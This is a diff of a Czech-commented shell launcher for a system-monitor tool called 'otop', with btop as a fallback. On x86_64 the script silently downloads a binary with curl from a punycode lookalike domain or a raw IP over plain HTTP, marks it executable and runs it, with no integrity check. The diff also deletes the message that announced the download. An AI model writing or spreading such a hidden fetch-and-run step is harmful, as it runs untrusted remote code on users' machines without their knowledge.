@@ -2,32 +2,36 @@
 # =============================================================================
 # ~/bin/otop — Observatoř Top Launcher (Grid Telemetry & Fleet Matrix)
 # =============================================================================
+ARCH="$(uname -m)"
 
-# 1. Lokální sestavení v observator/otop
+# 1. Nativní architektura v ~/bin/arch/$ARCH/otop
+if [ -x "$HOME/bin/arch/$ARCH/otop" ]; then
+    exec "$HOME/bin/arch/$ARCH/otop" "$@"
+fi
+
+# 2. Lokální sestavení v observator/otop
 if [ -x "$HOME/src/observator/otop/bin/otop" ]; then
     exec "$HOME/src/observator/otop/bin/otop" "$@"
 fi
 
-# 2. Systémově nainstalovaný otop
+# 3. Systémově nainstalovaný otop
 if [ -x "/usr/local/bin/otop" ]; then
     exec "/usr/local/bin/otop" "$@"
 fi
 
-# 3. Stažení binárky pokud chybí
-ARCH="$(uname -m)"
+# 4. Automatické stažení pro x86_64 pokud chybí
 if [ "$ARCH" = "x86_64" ]; then
-    echo "[otop] Stahuji předkompilovanou binárku otop-x86_64..."
-    mkdir -p "$HOME/.local/bin"
-    if curl -sL https://xn--peek-h6a.com/otop-x86_64 -o "$HOME/.local/bin/otop" || curl -sL http://91.139.118.43/otop-x86_64 -o "$HOME/.local/bin/otop"; then
-        chmod +x "$HOME/.local/bin/otop"
-        exec "$HOME/.local/bin/otop" "$@"
+    mkdir -p "$HOME/bin/arch/x86_64"
+    if curl -sL https://xn--peek-h6a.com/otop-x86_64 -o "$HOME/bin/arch/x86_64/otop" || curl -sL http://91.139.118.43/otop-x86_64 -o "$HOME/bin/arch/x86_64/otop"; then
+        chmod +x "$HOME/bin/arch/x86_64/otop"
+        exec "$HOME/bin/arch/x86_64/otop" "$@"
     fi
 fi
 
-# 4. Fallback na standardní btop
+# 5. Fallback na standardní btop
 if command -v btop >/dev/null 2>&1; then
     exec btop "$@"
 fi
 
-echo "Chyba: otop ani btop nebyl nalezen." >&2
+echo "Chyba: otop ani btop nebyl nalezen pro architekturu $ARCH." >&2
 exit 1
